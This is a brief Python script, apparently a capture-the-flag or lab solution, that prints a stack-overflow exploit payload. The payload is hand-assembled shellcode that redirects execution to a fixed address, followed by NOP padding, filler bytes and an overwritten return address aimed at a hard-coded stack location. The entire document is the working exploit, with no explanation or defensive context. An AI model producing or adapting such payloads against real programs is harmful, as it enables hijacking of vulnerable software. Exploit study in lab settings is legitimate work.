import sys

sc = bytes.fromhex("bf 04 00 00 00 68 87 1a 40 00 c3") + b"\x90" * 5
payload = sc + b"B" * 8 + (0x721000800fd0).to_bytes(8, "little")

sys.stdout.buffer.write(payload)

